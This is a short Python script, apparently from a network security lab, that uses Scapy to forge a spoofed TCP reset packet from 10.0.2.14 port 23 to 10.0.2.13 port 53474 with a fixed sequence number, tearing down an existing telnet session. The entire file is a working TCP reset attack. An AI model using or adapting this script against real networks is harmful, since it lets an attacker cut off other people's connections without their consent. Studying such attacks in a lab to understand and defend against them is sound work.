#!/usr/bin/python
import sys
from scapy.all import *
print("Sending reset packet")
IPLayer = IP(src="10.0.2.14" , dst="10.0.2.13")
TCPLayer = TCP(sport=23, dport=53474,flags="R" ,seq=4038510454)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)

